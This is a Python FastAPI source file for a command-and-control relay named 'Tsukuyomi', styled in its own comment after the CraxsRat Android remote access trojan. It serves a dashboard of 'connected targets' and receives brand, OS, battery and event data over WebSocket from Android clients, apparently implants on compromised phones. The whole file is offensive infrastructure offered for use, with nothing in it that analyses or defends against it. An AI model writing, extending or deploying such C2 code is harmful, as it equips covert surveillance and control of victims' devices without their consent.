from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
import json

app = FastAPI(title="Tsukuyomi C2 Relay")

connected_clients = {}
client_data = {}
dashboard_connections = []

@app.get("/", response_class=HTMLResponse)
async def get_dashboard():
    # Pro-level CraxsRat Style Mobile Admin Framework UI
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Tsukuyomi Mobile Admin Framework</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
        <style>
            body { background-color: #07090e; color: #e2e8f0; font-family: 'Inter', sans-serif; }
            .glass-panel { background: rgba(18, 24, 36, 0.75); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); }
            @keyframes pulse-fast { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.95); } }
            .pulse-live { animation: pulse-fast 1.5s infinite ease-in-out; }
            .scanline { background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(0, 240, 255, 0.15) 50%, rgba(255,255,255,0)); animation: scan 3s linear infinite; }
            @keyframes scan { 0% { transform: translateY(-100%); } 100% { transform: translateY(1000%); } }
        </style>
    </head>
    <body class="min-h-screen pb-20 flex flex-col items-center justify-start">
        <header class="w-full max-w-4xl glass-panel sticky top-0 z-50 px-4 py-3 border-b border-slate-800 flex items-center justify-between">
            <div class="flex items-center space-x-3">
                <div class="relative flex items-center justify-center w-10 h-10 rounded-xl bg-gradient-to-tr from-purple-600 to-cyan-400 text-slate-950 font-bold text-xl">
                    <i class="fa-solid fa-spider text-lg"></i>
                    <span class="absolute -bottom-1 -right-1 w-3.5 h-3.5 bg-emerald-400 rounded-full border-2 border-slate-950 pulse-live"></span>
                </div>
                <div>
                    <div class="flex items-center space-x-2">
                        <h1 class="font-mono font-bold text-base text-white">TSUKUYOMI</h1>
                        <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-cyan-400/10 text-cyan-400 border border-cyan-400/30">MOBILE ADMIN v7.4</span>
                    </div>
                    <p class="text-xs text-slate-400 font-mono">Status: <span class="text-emerald-400 font-semibold" id="c2Status">ONLINE</span></p>
                </div>
            </div>
        </header>

        <main class="w-full max-w-4xl px-3 py-4 space-y-4 flex-grow">
            <!-- TARGET DEVICES LIST -->
            <div class="glass-panel rounded-2xl p-4 border border-slate-800 space-y-4">
                <h2 class="text-xs font-bold font-mono text-cyan-400 uppercase tracking-wider">Connected Targets & Live Telemetry</h2>
                <div id="targetList" class="grid grid-cols-1 gap-3">
                    <div class="p-3.5 rounded-xl bg-slate-900/60 border border-slate-800 text-xs font-mono text-slate-400">
                        Waiting for incoming Android client connections...
                    </div>
                </div>
            </div>
        </main>

        <script>
            const ws = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host + '/ws/dashboard');
            ws.onmessage = function(event) {
                const data = JSON.parse(event.data);
                const list = document.getElementById('targetList');
                let html = '';
                for (const [id, info] of Object.entries(data)) {
                    html += `
                        <div class="p-4 rounded-xl bg-slate-900/80 border border-slate-800 space-y-2 font-mono text-xs">
                            <div class="flex justify-between items-center">
                                <span class="text-cyan-400 font-bold">Device ID: ${id}</span>
                                <span class="px-2 py-0.5 rounded bg-emerald-400/10 text-emerald-400 text-[10px]">CONNECTED</span>
                            </div>
                            <div class="grid grid-cols-2 sm:grid-cols-4 gap-2 text-slate-300">
                                <div><b>Brand:</b> ${info.brand || 'N/A'}</div>
                                <div><b>OS:</b> Android ${info.os || 'N/A'}</div>
                                <div><b>Battery:</b> ${info.battery || 'N/A'}%</div>
                                <div><b>Event:</b> ${info.event || 'Idle'}</div>
                            </div>
                        </div>
                    `;
                }
                list.innerHTML = html || '<div class="text-xs font-mono text-slate-500">No active targets connected.</div>';
            };
        </script>
    </body>
    </html>
    """

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    await websocket.accept()
    connected_clients[client_id] = websocket
    print(f"[+] Client Connected: {client_id}")
    try:
        while True:
            data = await websocket.receive_text()
            parsed = json.loads(data)
            client_data[client_id] = parsed
            await broadcast_to_dashboards()
    except WebSocketDisconnect:
        if client_id in connected_clients:
            del connected_clients[client_id]
        if client_id in client_data:
            del client_data[client_id]
        await broadcast_to_dashboards()

@app.websocket("/ws/dashboard")
async def websocket_dashboard(websocket: WebSocket):
    await websocket.accept()
    dashboard_connections.append(websocket)
    try:
        await websocket.send_text(json.dumps(client_data))
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        dashboard_connections.remove(websocket)

async def broadcast_to_dashboards():
    payload = json.dumps(client_data)
    for dash in dashboard_connections:
        try:
            await dash.send_text(payload)
        except:
            pass
